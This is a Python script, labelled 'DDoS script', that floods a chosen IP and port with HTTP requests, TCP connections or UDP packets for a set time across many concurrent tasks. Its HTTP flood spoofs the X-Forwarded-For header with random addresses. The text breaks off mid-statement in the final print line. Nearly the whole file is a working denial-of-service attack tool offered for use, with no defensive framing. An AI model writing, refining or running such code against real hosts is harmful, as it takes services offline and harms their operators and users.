import asyncio
import random
import socket
import ssl
import argparse
import aiohttp

from datetime import datetime


def random_ip():
    randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return randip


async def attack_http(ip, port, duration):
    headers = {
        'Connection': 'keep-alive',
        'Referer': f'http://{ip}/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'X-Forwarded-For': random_ip(),
        'Host': ip,
    }

    url = f"http://{ip}:{port}/"

    start_time = datetime.now()

    async with aiohttp.ClientSession(headers=headers) as session:
        while (datetime.now() - start_time).total_seconds() < duration:
            try:
                async with session.get(url) as response:
                    await response.text()
            except:
                pass


async def attack_tcp(ip, port, duration):
    start_time = datetime.now()

    while (datetime.now() - start_time).total_seconds() < duration:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
        except:
            pass


async def attack_udp(ip, port, duration):
    start_time = datetime.now()

    while (datetime.now() - start_time).total_seconds() < duration:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(b"", (ip, port))
        except:
            pass


async def run_attacks(ip, port, duration, threads, attack_type):
    tasks = []

    if attack_type == 'http':
        attack_func = attack_http
    elif attack_type == 'tcp':
        attack_func = attack_tcp
    elif attack_type == 'udp':
        attack_func = attack_udp
    else:
        raise ValueError(f"Invalid attack type: {attack_type}")

    for i in range(threads):
        task = asyncio.create_task(attack_func(ip, port, duration))
        tasks.append(task)

    await asyncio.gather(*tasks)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DDoS script')
    parser.add_argument('ip', type=str, help='Target IP address')
    parser.add_argument('port', type=int, help='Target port')
    parser.add_argument('duration', type=int, help='Attack duration (seconds)')
    parser.add_argument('threads', type=int, help='Number of threads')
    parser.add_argument('type', type=str, choices=['http', 'tcp', 'udp'], help='Attack type')
    args = parser.parse_args()

    print(f"[INFO] Starting {args.type.upper()}
